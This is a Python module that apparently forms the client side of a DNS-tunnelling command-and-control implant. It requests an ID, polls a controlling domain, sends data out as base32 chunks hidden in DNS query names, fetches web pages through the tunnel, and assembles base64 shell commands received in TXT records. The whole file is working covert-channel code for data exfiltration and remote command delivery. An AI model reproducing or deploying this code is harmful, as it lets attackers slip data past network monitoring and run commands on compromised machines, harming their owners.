import threading
import base64
import binascii
import dns.message
import dns.name
import dns.rdatatype
from enum import Enum
from typing import Union


class StateEnum(Enum):
    IDLE = 'idle'
    POLL = 'poll'
    CURL = 'curl'
    REQUESTING_ID = 'requesting_id'
    SENDING_DATA = 'sending_data'
    RECEIVING_DATA = 'receiving_data'
    RECEIVING_CURL_DATA = 'receiving_curl_data'
    RECEIVING_SHELL = 'receiving_shell'


class TransmissionState:

    def __init__(self, data: str, data_prefix: str):
        self._data = base64.b32encode(data.encode('utf-8')).decode('utf-8')
        self._data_prefix = data_prefix

    def get_next_data(self) -> tuple[str, bool]:
        if not self._data:
            return f"0.{self._data_prefix}"

        next_data = self._data_prefix
        for i in range(3):
            if not self._data:
                break
            next_data = f"{self._data[:63]}.{next_data}"
            self._data = self._data[63:]

        if not self._data:
            next_data = f"0.{next_data}"

        return next_data, not self._data

    @property
    def data(self) -> str:
        return self._data


class ClientState:

    def __init__(self):
        self.__client_id = None
        self.__state = {
            'state': StateEnum.IDLE,
            'transmission': None,
            'transmission_type': dns.rdatatype.A,
            'command': b"",
        }
        self.__data_storage = []
        self.__current_data = []
        self.__responses = []

        self.__state_lock = threading.Lock()
        self.__data_storage_lock = threading.Lock()
        self.__current_data_lock = threading.Lock()
        self.__responses_lock = threading.Lock()

    @property
    def state_lock(self) -> threading.Lock:
        return self.__state_lock

    @property
    def data_storage_lock(self) -> threading.Lock:
        return self.__data_storage_lock

    @property
    def current_data_lock(self) -> threading.Lock:
        return self.__current_data_lock

    @property
    def responses_lock(self) -> threading.Lock:
        return self.__responses_lock

    @property
    def client_id(self) -> int:
        return self.__client_id

    @client_id.setter
    def client_id(self, value: int):
        self.__client_id = value

    @property
    def current_data(self) -> list[bytes]:
        return self.__current_data

    @property
    def responses(self) -> list[str]:
        return self.__responses

    def add_response(self, response: str):
        with self.__responses_lock:
            self.responses.append(response)

    @property
    def state(self):
        return self.__state

    def set_state(self, state: dict[str, any]) -> None:
        with self.__state_lock:
            for k, v in state.items():
                self.__state[k] = v

    @property
    def data_storage(self):
        return self.__data_storage

    def add_data_to_storage(self, data: bytes, done: bool) -> None:
        with self.__data_storage_lock:
            self.__current_data.append(data)

            if done:
                d = b"".join(self.__current_data)
                try:
                    d = base64.b64decode(d).decode('utf-8')
                except binascii.Error:
                    d = ""

                self.__current_data = []
                self.__data_storage.append(d)


class ClientStateRequestHandler:

    def __init__(self, client_state: ClientState, domain: str):
        self._client_state = client_state
        self._domain = domain

    def request_id(self) -> dns.message.Message:
        self._client_state.set_state({'state': StateEnum.REQUESTING_ID})

        domain = dns.name.from_text(f"requestid.{self._domain}")
        return dns.message.make_query(domain, dns.rdatatype.A)

    def poll(self) -> dns.message.Message:
        self._client_state.set_state({'state': StateEnum.POLL})

        domain = dns.name.from_text(f"poll.{self._client_state.client_id}.{self._domain}")
        return dns.message.make_query(domain, dns.rdatatype.TXT)

    def continue_request(self) -> dns.message.Message:
        domain = dns.name.from_text(f"continue.{self._client_state.client_id}.{self._domain}")
        return dns.message.make_query(domain, dns.rdatatype.TXT)

    def continue_last_request(self) -> tuple[dns.message.Message, bool]:
        with self._client_state.state_lock:
            data, done = self._client_state.state['transmission'].get_next_data()
            data_type = self._client_state.state['transmission_type']
            domain = dns.name.from_text(f"{data}.{self._domain}")
            return dns.message.make_query(domain, data_type), done

    def curl(self, webpage: str) -> tuple[dns.message.Message, bool]:
        transmission = TransmissionState(webpage, f'curl.{self._client_state.client_id}')
        self._client_state.set_state({
            'state': StateEnum.CURL,
            'transmission': transmission,
            'transmission_type': dns.rdatatype.TXT,
        })

        with self._client_state.state_lock:
            curl_page, done = self._client_state.state['transmission'].get_next_data()

        domain = dns.name.from_text(f"{curl_page}.{self._domain}")
        return dns.message.make_query(domain, dns.rdatatype.TXT), done

    def data(self, data: str, is_head: bool) -> tuple[dns.message.Message, bool]:
        data_type = 'head' if is_head else 'body'
        transmission = TransmissionState(data, f'{data_type}.data.{self._client_state.client_id}')
        self._client_state.set_state({
            'state': StateEnum.SENDING_DATA,
            'transmission': transmission,
            'transmission_type': dns.rdatatype.A,
        })

        with self._client_state.state_lock:
            data, done = self._client_state.state['transmission'].get_next_data()

        domain = dns.name.from_text(f"{data}.{self._domain}")
        return dns.message.make_query(domain, dns.rdatatype.A), done


class ClientStateResponseHandler:

    def __init__(self, client_state: ClientState):
        self._client_state = client_state

    def client_id(self, client_id_or_ip: Union[bytes, int]) -> None:
        if type(client_id_or_ip) == bytes:
            self._client_state.client_id = int(client_id_or_ip[client_id_or_ip.rindex(b'.') + 1:])
            self._client_state.add_response(client_id_or_ip.decode('utf-8'))
        else:
            self._client_state.client_id = client_id_or_ip

    def data(self, data: bytes, done: bool) -> None:
        if done:
            self._client_state.set_state({'state': StateEnum.IDLE})
        else:
            with self._client_state.state_lock:
                state = self._client_state.state['state']

            if state == StateEnum.CURL or state == StateEnum.RECEIVING_CURL_DATA:
                self._client_state.set_state({'state': StateEnum.RECEIVING_CURL_DATA})
            else:
                self._client_state.set_state({'state': StateEnum.RECEIVING_DATA})

        self._client_state.add_data_to_storage(data, done)
        self._client_state.add_response(data.decode('utf-8'))

    def command(self, command: bytes, done: bool) -> str:
        with self._client_state.state_lock:
            current_command = self._client_state.state['command']

        self._client_state.add_response(command.decode('utf-8'))

        appended_command = current_command + command

        self._client_state.set_state({
            'state': StateEnum.RECEIVING_SHELL,
            'command': appended_command
        })

        if done:
            command = base64.b64decode(appended_command).decode('utf-8')

            self._client_state.set_state({
                'state': StateEnum.IDLE,
                'command': b"",
            })
            return command
        else:
            return ""

    def nothing(self, response: bytes) -> str:
        self._client_state.add_response(response.decode('utf-8'))
        return "NOTHING TO DO"

    def add_response(self, response: bytes):
        self._client_state.add_response(response.decode('utf-8'))


class ClientStateReader:

    def __init__(self, client_state: ClientState):
        self._client_state = client_state

    def read_client_id(self) -> int:
        return self._client_state.client_id

    def read_state(self) -> StateEnum:
        with self._client_state.state_lock:
            return self._client_state.state['state']

    def read_command(self) -> str:
        with self._client_state.state_lock:
            return self._client_state.state['command'].decode('utf-8')

    def read_latest_response(self) -> str:
        with self._client_state.responses_lock:
            try:
                return self._client_state.responses[-1]
            except IndexError:
                return ""

    def read_latest_data(self) -> str:
        with self._client_state.data_storage_lock:
            try:
                return self._client_state.data_storage[-1]
            except IndexError:
                return ""

    def read_current_data(self) -> str:
        with self._client_state.current_data_lock:
            current_data = b"".join(self._client_state.current_data).decode('utf-8')
            if not current_data:
                return base64.b64encode(self.read_latest_data().encode('utf-8')).decode('utf-8')
            else:
                return current_data

    def read_transmission_data(self) -> str:
        with self._client_state.state_lock:
            transmission = self._client_state.state['transmission']
            if transmission:
                return transmission.data
            else:
                return ""
